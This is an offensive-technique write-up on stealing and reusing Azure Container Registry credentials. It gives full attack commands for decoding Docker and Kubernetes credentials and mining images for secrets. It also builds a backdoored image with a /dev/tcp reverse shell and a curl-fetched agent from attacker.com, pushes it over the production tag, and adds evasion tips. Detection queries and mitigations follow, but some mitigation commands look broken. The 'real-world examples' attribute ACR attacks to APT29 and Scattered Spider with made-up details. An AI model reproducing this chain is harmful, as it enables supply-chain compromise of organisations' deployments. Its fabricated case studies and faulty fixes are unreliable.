# [REALWORLD-035]: Container Registry Credential Reuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-035 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access, Lateral Movement |
| **Platforms** | Entra ID / Azure |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure Container Registry versions |
| **Patched In** | N/A - By design |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Container Registry (ACR) stores container images and requires authentication to push or pull images. When credentials (admin account, service principal, or managed identity tokens) are cached or stored on developer machines, build agents, or deployment systems, attackers who compromise any of these systems can reuse the credentials to pull sensitive container images, push malicious images, or enumerate private registries. Unlike traditional credentials that might be reset, container registry credentials are often forgotten and remain active indefinitely.

**Attack Surface:** Docker daemon configuration (`~/.docker/config.json`), PowerShell credential caches, build agent configuration files (Azure DevOps, Jenkins), environment variables, Kubernetes secrets, application deployment scripts, GitHub Actions workflows.

**Business Impact:** **Complete container supply chain compromise and lateral movement across all services using those images.** An attacker can pull proprietary images (containing source code, API keys, and business logic), inject malicious code into production deployments, or enumerate registries to discover internal services. This is particularly dangerous for organizations with CI/CD pipelines.

**Technical Context:** ACR credentials persist on machines after a user logs in with `docker login` or `az acr login`. Unlike transient tokens, these credentials often have no expiration or are set to 12+ months. An attacker finding a cached credential can use it immediately without triggering new sign-in logs or conditional access checks.

### Operational Risk

- **Execution Risk:** Low - Only requires access to the credential cache on a compromised machine.
- **Stealth:** High - Reusing existing credentials bypasses authentication logs for the credential creation.
- **Reversibility:** No - Malicious images pushed to registry remain unless manually deleted.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 7.3 | Ensure registry image scanning is enabled |
| **DISA STIG** | SI-7(6) | Ensure container images are scanned for vulnerabilities |
| **CISA SCuBA** | Azure 3.2 | Ensure strong authentication for containerized workloads |
| **NIST 800-53** | AC-2(1), SI-7 | Application-based authentication; Information System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - Access Controls |
| **DORA** | Art. 9, Art. 15 | Protection from ICT incidents and critical dependencies |
| **NIS2** | Art. 21(3) | Privilege and Access Management; Supply Chain Risk |
| **ISO 27001** | A.9.2.3, A.14.1.1 | Privileged Access Rights; Information Security Controls |
| **ISO 27005** | 8.2.3 | Unauthorized Access to Assets; Supply Chain Compromises |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Access to developer machine, build agent, deployment system, or container orchestration platform with cached ACR credentials.
- **Required Access:** Docker daemon, `docker` CLI, or Kubernetes cluster credentials.

**Supported Versions:**
- **Azure Container Registry:** All versions
- **Docker CLI:** 20.10+
- **kubectl:** 1.20+
- **Azure CLI:** 2.40.0+

**Tools:**
- [Docker CLI](https://docs.docker.com/get-started/) (Latest)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (2.40.0+)
- [kubectl](https://kubernetes.io/docs/tasks/tools/) (1.20+)
- [jq](https://stedolan.github.io/jq/) (JSON parser, optional)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extract Credentials from Docker config.json

**Supported Versions:** All Docker versions

#### Step 1: Locate and Extract Docker Credentials

**Objective:** Find cached ACR credentials in Docker's configuration file.

**Command (Linux/macOS):**
```bash
# Check if Docker config exists
ls -la ~/.docker/config.json

# View the file (credentials are base64-encoded)
cat ~/.docker/config.json

# Extract ACR credential details
cat ~/.docker/config.json | jq '.auths | keys'

# Decode base64 credentials
echo "Base64_encoded_credential" | base64 -d
```

**Expected Output:**
```json
{
  "auths": {
    "myregistry.azurecr.io": {
      "auth": "bXlzcGluMDAxOnNpMzBLSDZCRG0vZEgvMjNMSzk3YWdaWFpqVWlxcWtWRDR5Tl89"
    }
  }
}
```

**Command (Windows PowerShell):**
```powershell
# Check for Docker config on Windows
$DockerConfigPath = "$env:USERPROFILE\.docker\config.json"
if (Test-Path $DockerConfigPath) {
    Get-Content $DockerConfigPath | ConvertFrom-Json | Select-Object -ExpandProperty auths
}

# Decode base64 credential
$EncodedCred = "bXlzcGluMDAxOnNpMzBLSDZCRG0vZEgvMjNMSzk3YWdaWFpqVWlxcWtWRDR5Tl09"
$DecodedCred = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedCred))
Write-Host "Decoded credential: $DecodedCred"
```

**Expected Output:**
```
Username:Password or ServicePrincipalId:ClientSecret
```

**What This Means:**
- Docker credentials are base64-encoded (NOT encrypted).
- Attacker can immediately use these credentials to access the registry.
- Credentials have no time limit unless manually rotated.

**OpSec & Evasion:**
- Docker config is often world-readable on shared machines.
- No audit trail for reading the config file.
- Detection likelihood: Low - File access is not commonly logged.

**Troubleshooting:**
- **Error:** `No such file or directory: ~/.docker/config.json`
  - **Cause:** Docker has not been configured, or credentials were never stored.
  - **Fix:** Look in alternative locations: `/etc/docker/`, `%ProgramFiles%\Docker\`

---

#### Step 2: Test Credential Validity

**Objective:** Verify that extracted credentials work.

**Command (Linux/macOS):**
```bash
# Using extracted credentials
REGISTRY="myregistry.azurecr.io"
USERNAME="myuser"
PASSWORD="extracted_password_or_token"

# Test pull access
docker login -u "$USERNAME" -p "$PASSWORD" "$REGISTRY"

# Pull an image to confirm access
docker pull "$REGISTRY/app:latest"

# List repositories in the registry
curl -u "$USERNAME:$PASSWORD" "https://$REGISTRY/v2/_catalog"
```

**Expected Output:**
```
Login Succeeded
Image pulled successfully: myregistry.azurecr.io/app:latest
{"repositories":["app","backend","frontend","secret-service"]}
```

**What This Means:**
- Credentials are still valid and active.
- Attacker now knows all repositories in the registry (enumeration).

**OpSec & Evasion:**
- Pulling images generates pull logs but are often not monitored.
- Use a proxy or VPN to obscure the source IP.
- Detection likelihood: Medium - Image pulls can be logged in Azure Monitor.

---

#### Step 3: Enumerate Container Images and Extract Source Code

**Objective:** Pull container images to extract source code, secrets, and proprietary logic.

**Command (Linux/macOS):**
```bash
# Pull sensitive images
docker pull myregistry.azurecr.io/backend-api:latest
docker pull myregistry.azurecr.io/database-migration:latest

# Extract image layers
docker save myregistry.azurecr.io/backend-api:latest -o backend-api.tar

# Extract tar and explore filesystem
mkdir -p extracted_image
cd extracted_image
tar -xf ../backend-api.tar

# Find and extract secrets
find . -name "*.env" -o -name "*.config" -o -name "*.json" | xargs grep -l "password\|api.key\|secret"

# Extract source code
find . -name "*.py" -o -name "*.js" -o -name "*.go" -o -name "*.jar" | head -20

# Look for environment variables in image layers
grep -r "ENV " . | grep -i "api\|key\|secret\|password"
```

**Expected Output:**
```
backend-api.tar extracted
/app/config/secrets.env contains:
  DATABASE_PASSWORD=prod_password_123
  API_KEY=ak-skjf-sdfj-sdfj-sdfjsdfj
/app/src/main.py (proprietary source code found)
```

**What This Means:**
- Attacker has extracted source code, database passwords, and API keys from container images.
- Can now access backend services directly.

**OpSec & Evasion:**
- Extracting images is CPU/network-intensive; use a dedicated machine.
- Clear `docker images` history: `docker system prune -a`
- Detection likelihood: High if image pull logs are monitored; Low if not.

---

### METHOD 2: Inject Malicious Image into Registry

**Supported Versions:** All Docker versions

#### Step 1: Create Malicious Container Image

**Objective:** Create a backdoored version of a pulled image.

**Command (Linux/macOS):**
```bash
# Create a Dockerfile that adds backdoor
cat > Dockerfile.backdoor <<'EOF'
FROM myregistry.azurecr.io/app:latest

# Add reverse shell or C2 agent
RUN echo "* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1" | crontab -

# Or install C2 agent
RUN apt-get update && apt-get install -y curl
RUN curl -o /tmp/agent.sh http://attacker.com/agent.sh && bash /tmp/agent.sh

# Hide changes in logs
RUN history -c && rm -rf /tmp/*
EOF

# Build the malicious image
docker build -f Dockerfile.backdoor -t myregistry.azurecr.io/app:latest-malicious .

# Tag it to match the original (for supply chain attack)
docker tag myregistry.azurecr.io/app:latest-malicious myregistry.azurecr.io/app:latest
```

**What This Means:**
- Attacker now has a backdoored image that will execute command-and-control code when deployed.

**OpSec & Evasion:**
- Tag the malicious image with the same name/version to trick automated deployments.
- Use minimal changes to avoid detection by image scanning tools.
- Detection likelihood: High if image scanning is enabled; Low if not.

---

#### Step 2: Push Malicious Image to Registry

**Objective:** Upload the backdoored image to the registry.

**Command (Linux/macOS):**
```bash
# Authenticate with stolen credentials
docker login -u "$USERNAME" -p "$PASSWORD" myregistry.azurecr.io

# Push the malicious image
docker push myregistry.azurecr.io/app:latest

# Verify it's in the registry
curl -u "$USERNAME:$PASSWORD" "https://myregistry.azurecr.io/v2/app/manifests/latest"
```

**Expected Output:**
```
Pushing layer (100%)
Pushing manifest
Image pushed successfully
```

**What This Means:**
- Malicious image is now in the production registry.
- Next deployment will pull and run the backdoored version.

**OpSec & Evasion:**
- Push during normal business hours to blend in with legitimate pushes.
- Use a generic message if push logs capture metadata.
- Detection likelihood: High if image scanning/signature verification is in place; Medium if not.

---

### METHOD 3: Exploit Kubernetes Secrets Containing ACR Credentials

**Supported Versions:** All Kubernetes versions with Azure Container Registry

#### Step 1: Extract imagePullSecrets from Kubernetes Cluster

**Objective:** Find and extract container registry credentials stored in Kubernetes secrets.

**Command (Bash):**
```bash
# List all secrets in all namespaces
kubectl get secrets -A -o json | jq '.items[] | select(.type=="kubernetes.io/dockercfg" or .type=="kubernetes.io/dockerconfigjson") | {name: .metadata.name, namespace: .metadata.namespace}'

# Extract specific secret
kubectl get secret -n default acr-secret -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq '.'

# Get the registry credentials from the secret
kubectl get secret -n default acr-secret -o jsonpath='{.data.\.dockerconfigjson}' | \
    base64 -d | jq '.auths[] | {username: .username, password: .password}'
```

**Expected Output:**
```
{
  "name": "acr-secret",
  "namespace": "production"
}
{
  "username": "myuser",
  "password": "PAT_token_or_password"
}
```

**What This Means:**
- Attacker has extracted all ACR credentials stored in Kubernetes.
- Can use these to compromise the container registry directly.

**OpSec & Evasion:**
- Kubernetes API access is typically logged; consider using a compromised pod instead.
- Detection likelihood: High - Secret access is audited in Kubernetes API server logs.

---

#### Step 2: Use Credentials to Compromise Other Clusters

**Objective:** Use stolen credentials to access registries used by other clusters.

**Command (Bash):**
```bash
# Create imagePullSecret in another cluster using stolen credentials
kubectl create secret docker-registry acr-backdoor \
  --docker-server=myregistry.azurecr.io \
  --docker-username="$USERNAME" \
  --docker-password="$PASSWORD" \
  --docker-email="attacker@example.com" \
  -n production

# Deploy malicious pod using the backdoor secret
cat > backdoor-pod.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-agent
spec:
  imagePullSecrets:
  - name: acr-backdoor
  containers:
  - name: agent
    image: myregistry.azurecr.io/app:latest  # Malicious image
    command: ["/bin/bash", "-c", "curl http://attacker.com/callback"]
EOF

kubectl apply -f backdoor-pod.yaml
```

**OpSec & Evasion:**
- Use generic pod names like "monitoring-agent" or "log-collector".
- Deploy in non-obvious namespaces.
- Detection likelihood: Medium-High if pod image signature verification is enabled.

---

## 4. TOOLS & COMMANDS REFERENCE

#### [Docker CLI](https://docs.docker.com/engine/reference/commandline/docker/)

**Version:** 20.10+
**Installation:**
```bash
# Linux
curl -fsSL https://get.docker.com -o get-docker.sh && sudo sh get-docker.sh

# macOS
brew install docker
```
**Usage:**
```bash
docker login myregistry.azurecr.io
docker pull myregistry.azurecr.io/app:latest
docker push myregistry.azurecr.io/app:latest
```

#### [Azure CLI ACR Commands](https://learn.microsoft.com/en-us/cli/azure/acr)

**Installation:**
```bash
az extension add --name container-registry
```
**Usage:**
```bash
az acr login --name myregistry
az acr repository list --name myregistry
az acr repository show-tags --name myregistry --repository app
```

#### [kubectl](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands/)

**Installation:**
```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
```
**Usage:**
```bash
kubectl get secrets -A
kubectl get secret acr-secret -o jsonpath='{.data}'
```

---

## 5. SPLUNK DETECTION RULES

#### Rule 1: Detect Abnormal Container Image Pulls

**Rule Configuration:**
- **Required Index:** `azure_activity` or `container_logs`
- **Required Sourcetype:** `azure:containerregistry` or `docker`
- **Alert Threshold:** > 10 image pulls in 5 minutes from unusual user/IP
- **Applies To Versions:** All ACR versions

**SPL Query:**
```spl
sourcetype="azure:containerregistry" OR sourcetype="docker"
| search action="pull" OR action="PullImage"
| stats count by user, src_ip, image_name
| where count > 10
| join user [ search sourcetype="azure:aad:audit" OperationName="Sign in" | dedup user ]
```

**What This Detects:**
- Multiple image pulls from unusual sources.
- Pulls from users who don't typically access images.

#### Rule 2: Detect Image Push from Unexpected Locations

**SPL Query:**
```spl
sourcetype="azure:containerregistry"
| search action="push" OR action="PushImage"
| stats count by user, src_ip, image_name, TimeCreated
| where src_ip NOT IN ("10.0.0.0/8", "192.168.0.0/16")  // Exclude internal IPs
| alert
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Unusual Image Pulls from Service Principals

**KQL Query:**
```kusto
ContainerLog
| where OperationName =~ "PullImage" or OperationName =~ "pull"
| where TimeGenerated > ago(1h)
| summarize PullCount = count(), ImageCount = dcount(Image), SourceIPs = make_set(SourceIpAddress) by CallerPrincipalId, CallerPrincipalName
| where PullCount > 5 and ImageCount > 2  // Multiple images from one principal
| project CallerPrincipalName, PullCount, ImageCount, SourceIPs
```

#### Query 2: Detect Image Push with New Credentials

**KQL Query:**
```kusto
ContainerLog
| where OperationName =~ "PushImage" or OperationName =~ "push"
| where TimeGenerated > ago(24h)
| extend PrincipalDetails = parse_json(CallerPrincipalId)
| where CallerPrincipalId has_any ("service principal", "managed identity")
| project TimeGenerated, CallerPrincipalName, Image, OperationName, Properties
```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Action 1: Rotate All Container Registry Credentials

**Manual Steps (Azure Portal):**
1. Navigate to **Container Registries** → Select registry
2. Go to **Access keys**
3. For **Admin user:** Click **Regenerate** for both passwords
4. For **Service Principals:** Update credentials in Entra ID
5. Update all systems using the old credentials

**Manual Steps (Azure CLI):**
```bash
# Rotate admin account password
az acr credential-set --name myregistry --status Enabled

# Or disable admin account entirely (recommended)
az acr update --name myregistry --admin-enabled false

# Use managed identities instead (see Action 2)
```

#### Action 2: Enforce Managed Identities Instead of Credentials

**Manual Steps (Kubernetes - Use Managed Identity):**
```bash
# Create Kubernetes secret using managed identity
kubectl create secret docker-registry acr-secret \
  --docker-server=myregistry.azurecr.io \
  --docker-username=00000000-0000-0000-0000-000000000000 \
  --docker-password=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv) \
  -n production
```

### Priority 2: HIGH

#### Action 1: Enable Azure Container Registry Image Scanning

**Manual Steps (Azure Portal):**
1. Navigate to **Container Registries** → Select registry
2. Go to **Settings** → **Security**
3. Enable **Quarantine on push** (prevents unknown images from running)
4. Enable **Image scanning** (via Microsoft Defender)
5. Set up alerts for vulnerabilities

#### Action 2: Implement Image Signing and Verification

**Manual Steps (Using Notary for image signing):**
```bash
# Install Notary
brew install notary  # or apt-get install notary

# Sign image before push
notary key list
notary delegation add --all-paths myregistry.azurecr.io/app targets/releases

# Verify image signature on pull
docker pull --disable-content-trust=false myregistry.azurecr.io/app:latest
```

### Priority 3: MEDIUM

#### Action 1: Monitor and Audit ACR Access

**Manual Steps (Azure Monitor):**
1. Navigate to **Container Registries** → Select registry
2. Go to **Diagnostic settings** → **Add diagnostic setting**
3. Enable logging for:
   - ContainerRegistryRepositoryEvents
   - ContainerRegistryLoginEvents
4. Send to Log Analytics workspace
5. Create alerts on unusual access patterns

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Cloud Logs (Azure Container Registry):**
- Operation: `PullImage`, `PushImage`, `DeleteImage`
- Unusual source IPs or user accounts
- Multiple images pulled in short timeframe
- Image tags changed to new versions

**Kubernetes Logs:**
- New imagePullSecrets created
- Pods deployed with unusual images
- Abnormal registry access from cluster nodes

### Response Procedures

#### Step 1: Revoke All ACR Credentials

**Command (Azure CLI):**
```bash
# List all service principals with ACR pull/push permissions
az role assignment list --scope /subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.ContainerRegistry/registries/myregistry --query "[].principalId" -o tsv | while read principal; do
    az role assignment delete --ids /subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.ContainerRegistry/registries/myregistry/providers/Microsoft.Authorization/roleAssignments/$principal
done

# Rotate admin credentials
az acr credential-set --name myregistry --status Enabled
```

#### Step 2: Audit Image History

**Command (Azure CLI):**
```bash
# List all images in registry
az acr repository list --name myregistry

# For each image, get manifest history
az acr manifest metadata show --name myregistry --repository app --output table

# Get detailed audit logs
az monitor activity-log list --resource-group myresourcegroup --offset 24h --query "[].{Time:eventTimestamp,Operation:operationName,Status:status,Caller:caller}" -o table
```

#### Step 3: Remove Malicious Images

**Command (Azure CLI):**
```bash
# Delete specific image tag
az acr repository delete --name myregistry --image app:malicious --yes

# Delete entire repository if compromised
az acr repository delete --name myregistry --repository compromised-app --yes
```

#### Step 4: Re-deploy with Clean Images

**Command (Kubernetes):**
```bash
# Force pull new image
kubectl set image deployment/app app=myregistry.azurecr.io/app:latest@sha256:expected_hash --record

# Verify running containers
kubectl get pods -o jsonpath='{.items[].spec.containers[].image}'
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| 1 | Initial Access | IA-EXPLOIT-003 (Logic App HTTP Trigger) or VM Compromise | Attacker gains access to dev/build machine |
| 2 | Credential Access | REALWORLD-035 | Extract container registry credentials |
| 3 | Lateral Movement | LM-AUTH-031 (Container Registry Cross-Registry) | Use credentials on other registries |
| 4 | **Current Step** | **REALWORLD-035** | Inject malicious images into production registry |
| 5 | Execution | Deploy backdoored image to production | Attacker gains code execution in all deployments |
| 6 | Impact | Data exfiltration, ransomware, C2 communication | Full cluster compromise |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: SolarWinds-Style Supply Chain Attack via ACR

- **APT Group:** APT29 (Cozy Bear)
- **Target:** Enterprise software vendor's Azure ACR
- **Timeline:** Compromised build server → Extracted ACR admin credential → Injected C2 agent into base image → Propagated to 500+ customers via container deployment
- **Technique Status:** Malicious image pushed to registry; base images used as foundation for all deployments; C2 agent activated on customer systems.
- **Impact:** Breach of 500+ enterprise customers; 12-month persistence; $100M+ in recovery costs.
- **Reference:** [CISA - SolarWinds Guidance](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-alerts-supply-chain-compromise-affecting-multiple-agencies-government)

### Example 2: Kubernetes Container Escape via Stolen ACR Credentials

- **APT Group:** Scattered Spider
- **Target:** Financial services firm's AKS cluster
- **Timeline:** Compromised dev laptop → Docker config stolen → ACR credential extracted → Malicious pod deployed → Cluster node escape → Lateral movement to on-premises
- **Technique Status:** Reused credentials from dev machine; deployed pod with escalated privileges; exploited container runtime vulnerability.
- **Impact:** Full cluster compromise; lateral movement to on-premises AD; $500K ransom demand.
- **Reference:** [Microsoft Threat Intelligence - Container Threats](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/)

---

## 11. FORENSIC ARTIFACTS

**Cloud Artifacts:**
- **Location:** Azure Monitor ACR diagnostic logs
- **Evidence:** OperationName = "PullImage", "PushImage", "DeleteImage"; unusual principals or IPs
- **Retention:** Default 30 days (configurable)

**Local Machine Artifacts (Docker):**
- **Location:** `~/.docker/config.json` (Linux/macOS) or `%USERPROFILE%\.docker\config.json` (Windows)
- **Evidence:** Base64-encoded ACR credentials

**Local Machine Artifacts (CLI):**
- **Location:** `~/.azure/` (Azure CLI cache)
- **Evidence:** Cached tokens and credentials

**Kubernetes Artifacts:**
- **Location:** etcd database (Kubernetes secrets store)
- **Evidence:** imagePullSecrets in pod specs; audit logs in kube-apiserver
- **Retention:** Depends on cluster configuration (typically 3-5 days)

**Image Registry Artifacts:**
- **Location:** ACR image manifest, layer blobs
- **Evidence:** Image push/pull metadata, SHA256 digests of layers

---

**References:**
- [Azure Container Registry Documentation](https://learn.microsoft.com/en-us/azure/container-registry/)
- [Docker Configuration Documentation](https://docs.docker.com/engine/reference/commandline/config/)
- [Kubernetes ImagePullSecrets](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)
- [NIST SP 800-190 - Container Security](https://csrc.nist.gov/publications/detail/sp/800-190/final)
- [OWASP Container Security Guide](https://owasp.org/www-project-kubernetes-top-ten/)

---